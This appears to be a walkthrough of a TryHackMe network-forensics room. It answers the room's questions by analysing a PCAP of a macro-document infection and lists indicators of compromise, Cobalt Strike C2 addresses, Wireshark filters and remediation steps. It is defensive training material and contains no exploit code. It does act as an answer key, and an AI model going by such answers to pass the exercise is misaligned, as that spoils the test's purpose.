
# Carnage - Malicious Network Traffic Analysis

## Overview

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Room | Carnage |
| Category | Network Forensics / Malware Traffic Analysis |
| Tool Used | Wireshark |
| Difficulty | Medium |

---

# Scenario

Eric Fischer from the Purchasing Department at Bartell Ltd received an email from a known contact containing a Word document attachment.

After opening the document, Eric clicked on **"Enable Content"**, which allowed malicious activity to execute.

The SOC team immediately received an alert indicating that Eric's workstation was making suspicious outbound connections.

A PCAP file was retrieved from the network sensor and provided for investigation.

The objective of this investigation was to analyze the packet capture, identify malicious activity, discover attacker infrastructure, and extract Indicators of Compromise (IOCs).

---

# Investigation Questions & Answers

## Q1. What was the date and time for the first HTTP connection to the malicious IP?

**Answer:**
```
2021-09-24 16:44:38
```

**Analysis:**

Used the HTTP filter in Wireshark and analyzed the first HTTP connection. The packet contained a GET request for a malicious file.

```
GET /incidunt-consequatur/documents.zip HTTP/1.1
Host: attirenepal.com
```

---

## Q2. What is the name of the zip file that was downloaded?

**Answer:**
```
documents.zip
```

Found in the HTTP packet details.

---

## Q3. What was the domain hosting the malicious zip file?

**Answer:**
```
attirenepal.com
```

Found in the HTTP Host header.

---

## Q4. What is the name of the file inside the zip file?

**Answer:**
```
chart-1530076591.xls
```

Used **Follow HTTP Stream** to inspect the downloaded content without downloading the file.

---

## Q5. What was the name of the webserver of the malicious IP?

**Answer:**
```
LiteSpeed
```

Found in the HTTP stream server information.

---

## Q6. What is the version of the webserver?

**Answer:**
```
PHP/7.2.34
```

Found in the same HTTP stream.

---

## Q7. What were the three domains involved in malicious file downloads?

**Answer:**

```
finejewels.com.au
thietbiagt.com
new.americold.com
```

Used DNS filtering and analyzed suspicious domain activity.

---

## Q8. Which certificate authority issued the SSL certificate?

**Answer:**
```
GoDaddy
```

Found by analyzing HTTPS traffic and certificate information.

---

## Q9. What are the two Cobalt Strike server IP addresses?

**Answer:**

```
185.106.96.158
185.125.204.174
```

Identified using Wireshark Conversations and verified using VirusTotal Community.

---

## Q10. What is the Host header for the first Cobalt Strike IP?

**Answer:**
```
ocsp.verisign.com
```

Found by filtering HTTP traffic with the specific IP address.

---

## Q11. What is the domain name for the first Cobalt Strike server?

**Answer:**
```
survmeter.live
```

Confirmed using VirusTotal Community.

---

## Q12. What is the domain name for the second Cobalt Strike server?

**Answer:**
```
securitybusinpuff.com
```

Confirmed using VirusTotal Community.

---

## Q13. What is the domain name of the post-infection traffic?

**Answer:**
```
maldivehost.net
```

Found by analyzing post-infection HTTP traffic.

---

## Q14. What are the first eleven characters sent to the malicious domain?

**Answer:**
```
zLIisQRWZI9
```

Found using Follow HTTP Stream.

---

## Q15. What was the length of the first packet sent to the C2 server?

**Answer:**
```
281
```

Found from packet details.

---

## Q16. What was the Server header for the malicious domain?

**Answer:**
```
Apache/2.4.49 (cPanel) OpenSSL/1.1.1l mod_bwlimited/1.4
```

Found through HTTP stream analysis.

---

## Q17. When did the DNS query for the IP checking domain occur?

**Answer:**
```
2021-09-24 17:00:04 UTC
```

Found using DNS filtering and searching for the API request.

---

## Q18. What was the domain in the DNS query?

**Answer:**
```
api.ipify.org
```

Used for checking the victim's public IP address.

---

## Q19. What was the first MAIL FROM address observed?

**Answer:**
```
farshin@mailfa.com
```

Found by filtering SMTP traffic.

---

## Q20. How many SMTP packets were observed?

**Answer:**
```
1439
```

Found by applying the SMTP filter.


# Indicators of Compromise (IOCs)

## Domains

| Type | Indicator |
|-|-|
| Malicious Domain | attirenepal.com |
| Malicious Domain | finejewels.com.au |
| Malicious Domain | thietbiagt.com |
| Malicious Domain | new.americold.com |
| C2 Domain | survmeter.live |
| C2 Domain | securitybusinpuff.com |
| Post-Infection Domain | maldivehost.net |
| IP Lookup Domain | api.ipify.org |

---

## IP Addresses

| Type | Indicator |
|-|-|
| Cobalt Strike C2 | 185.106.96.158 |
| Cobalt Strike C2 | 185.125.204.174 |

---

## Files

| File | Description |
|-|-|
| documents.zip | Malicious archive downloaded through HTTP |
| chart-1530076591.xls | Malicious document contained inside ZIP |

---

# Wireshark Filters Used

```
http

dns

smtp

tcp.port == 443

http.request.method == POST

Follow HTTP Stream
```

---

# MITRE ATT&CK Mapping

| Technique | Description |
|-|-|
| T1566 | Phishing |
| T1204 | User Execution |
| T1105 | Ingress Tool Transfer |
| T1071 | Application Layer Protocol |
| T1583 | Acquire Infrastructure |

---

# Detection Opportunities

A SOC team could detect this activity through:

- Suspicious HTTP file downloads
- Malicious email attachments
- Connections to known malicious domains
- Cobalt Strike beacon traffic
- Abnormal DNS requests
- Suspicious outbound connections
- Endpoint alerts after macro execution

---

# Remediation Recommendations

Recommended actions:

- Block malicious domains and IP addresses
- Remove malicious files from affected endpoints
- Perform endpoint malware scanning
- Investigate other potentially affected systems
- Reset compromised credentials
- Improve email security controls
- Monitor for C2 communication

---

# Lessons Learned

This investigation demonstrated how Wireshark can be used for malware traffic analysis and incident response.

Key skills practiced:

- HTTP traffic analysis
- DNS investigation
- Following TCP/HTTP streams
- Identifying attacker infrastructure
- Extracting IOCs
- Using VirusTotal for threat intelligence validation
- Detecting Cobalt Strike communication patterns

---

# References

- TryHackMe - Carnage
- Wireshark Documentation
- VirusTotal Community
